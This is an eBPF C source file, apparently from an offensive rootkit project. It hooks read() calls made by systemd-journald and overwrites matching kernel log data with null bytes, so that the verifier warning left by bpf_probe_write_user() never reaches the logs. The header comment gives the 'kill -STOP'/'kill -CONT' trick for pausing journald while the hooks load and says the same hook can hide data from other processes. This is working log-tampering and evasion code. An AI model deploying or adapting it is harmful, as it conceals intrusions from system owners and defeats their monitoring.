//go:build ignore

/*  The goal here is to create an eBPF program that cleans the data read by 
    journald from /dev/kmsg, specifically removing warnings emitted by the 
    verifier due to the use of bpf_probe_write_user(). However, since the 
    warning is generated before our hooks become active, we need a workaround.

    One effective solution is to briefly pause systemd-journald, load our eBPF
    programs, and then resume systemd-journald. This ensures our hooks on 
    read() are in place and active before journald continues reading from 
    /dev/kmsg, allowing us to filter out unwanted messages.

    kill -STOP $(pidof systemd-journald)
    # Load eBPF programs
    kill -CONT $(pidof systemd-journald)

    We will filter all read() calls made by systemd-journald, searching for
    specific patterns in the data read. If a match is found, we will replace
    the original data with null bytes, journald will simply ignore it, no log 
    will be written, and the warning will not appear in the logs.

    Pausing systemd-journald is not very discreet and may be noticed by 
    monitoring tools.

    You can use this program to hook specific read() calls from another proceess
    with different patterns, not just systemd-journald.
*/

#include "vmlinux.h"
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include "hide_read.h"

SEC("tp/syscalls/sys_enter_read")
int hook_read_enter(struct trace_event_raw_sys_enter *ctx)
{
    u32 pid = (u32)bpf_get_current_pid_tgid();
    u64 read_buf = 0;

    char comm[TASK_COMM_LEN] = {};
    bpf_get_current_comm(&comm, sizeof(comm));
    int found_command = 0;

    for (int c = 0; c < MAX_COMMANDS; c++) {
        if (__builtin_strncmp(comm, commands[c].command, commands[c].len) == 0) {
            found_command = 1;
            break;
        }
    }
    
    if (!found_command) {
        return 0;
    }

    bpf_core_read(&read_buf, sizeof(read_buf), &ctx->args[1]);
    bpf_map_update_elem(&read_buf_map, &pid, &read_buf, BPF_ANY);
    return 0;
}

SEC("tp/syscalls/sys_exit_read")
int hook_read_exit(struct trace_event_raw_sys_exit *ctx)
{
   u64 pid = (u32)bpf_get_current_pid_tgid();
   u64 *read_buf = bpf_map_lookup_elem(&read_buf_map, &pid);

   if (!read_buf) {
      return 0;
   }
   long ret = 0;
   bpf_core_read(&ret, sizeof(ret), &ctx->ret);

   if (ret <= 0 || read_buf == NULL)
        return 0;
    ret = ret > MAX_BUF ? MAX_BUF : ret;
    char data[MAX_BUF] = {};

    if (bpf_core_read_user_str(&data, ret, (void *)*read_buf) < 0) {
    return 0;
    }
    u32 key = PATCH_KEY;
    char *patch = bpf_map_lookup_elem(&patch_map, &key);

    if (!patch)
        return 0;

    for (int p = 0; p < MAX_PATTERNS; p++) {
        if (patterns[p].len == 0)
        continue;
        int limit = ret > patterns[p].len ? ret - patterns[p].len : 0;
        for (int i = 0; i < limit; i++) {
            if (__builtin_memcmp(&data[i], patterns[p].pattern, patterns[p].len) == 0) {
                bpf_probe_write_user((void *)*read_buf, patch, ret);
                return 0;
            }
        }
    }

    return 0;
}
char LICENSE[] SEC("license") = "GPL";